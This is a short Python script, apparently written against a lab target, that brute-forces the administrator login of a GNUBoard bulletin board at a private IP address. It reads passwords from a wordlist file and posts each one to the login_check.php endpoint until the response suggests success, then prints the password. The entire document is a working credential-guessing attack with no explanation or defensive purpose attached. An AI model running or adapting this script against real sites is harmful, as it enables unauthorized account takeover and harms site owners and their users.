import requests
from bs4 import BeautifulSoup

login_url = "http://192.168.10.4/gnu/bbs/login_check.php"

session = requests.session()
pwlist = []
f=open("pwlist.txt","r")


for x in f.readlines():
    pwlist.append(x.replace("\n",""))

params = dict()
params['mb_id'] = 'admin'
for x in pwlist:
    params['mb_password'] = x    
    res = session.post(login_url, data=params)
    if(res.text.find("login")>0):
        print("password : "+x)
        break





